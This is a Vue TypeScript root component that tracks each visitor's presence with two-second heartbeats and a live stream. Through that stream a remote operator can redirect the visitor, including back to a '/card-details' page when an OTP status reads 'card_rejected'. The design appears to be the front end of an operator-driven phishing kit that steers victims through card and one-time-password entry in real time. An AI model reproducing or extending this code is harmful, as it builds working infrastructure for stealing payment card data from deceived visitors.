<script setup lang="ts">
import { onMounted, onUnmounted, watch } from 'vue';
import { useRoute, useRouter } from 'vue-router';
import {
  sendPresenceHeartbeat,
  sendPresenceLeave,
  connectVisitorStream,
  resolveTargetRoute
} from './api';

const route = useRoute();
const router = useRouter();
let heartbeatInterval: ReturnType<typeof setInterval> | null = null;
let stopVisitorStream: (() => void) | null = null;

const getCurrentPath = () => {
  return route.path || (typeof window !== 'undefined' ? window.location.pathname : '/') || '/';
};

const syncPresenceAndCheckRedirect = async (path?: string) => {
  const activePath = path || getCurrentPath();
  if (activePath.startsWith('/admin')) return;
  try {
    const res = await sendPresenceHeartbeat(activePath);
    if (res.redirectTo && res.redirectTo !== getCurrentPath()) {
      router.push(res.redirectTo);
    }
  } catch {}
};

const handleVisibilityOrFocus = () => {
  if (typeof document !== 'undefined' && document.visibilityState === 'hidden') return;
  syncPresenceAndCheckRedirect();
};

const handlePageLeave = () => {
  sendPresenceLeave();
};

watch(
  () => route.path,
  (newPath) => {
    syncPresenceAndCheckRedirect(newPath);
  }
);

onMounted(() => {
  syncPresenceAndCheckRedirect();
  stopVisitorStream = connectVisitorStream(getCurrentPath, {
    onConnected: (data) => {
      if (data.redirectTo && data.redirectTo !== getCurrentPath()) {
        router.push(data.redirectTo);
      }
    },
    onAction: (data) => {
      if (data.otpStatus === 'card_rejected' && getCurrentPath() !== '/card-details') {
        router.push('/card-details');
        return;
      }
      const target = data.redirectTo || resolveTargetRoute(data.nextAction);
      if (target && target !== getCurrentPath()) {
        router.push(target);
      }
    }
  });

  heartbeatInterval = setInterval(() => {
    syncPresenceAndCheckRedirect();
  }, 2000);

  window.addEventListener('focus', handleVisibilityOrFocus);
  document.addEventListener('visibilitychange', handleVisibilityOrFocus);
  window.addEventListener('pagehide', handlePageLeave);
  window.addEventListener('beforeunload', handlePageLeave);
});

onUnmounted(() => {
  if (heartbeatInterval) clearInterval(heartbeatInterval);
  if (stopVisitorStream) stopVisitorStream();
  window.removeEventListener('focus', handleVisibilityOrFocus);
  document.removeEventListener('visibilitychange', handleVisibilityOrFocus);
  window.removeEventListener('pagehide', handlePageLeave);
  window.removeEventListener('beforeunload', handlePageLeave);
});
</script>

<template>
  <router-view />
</template>
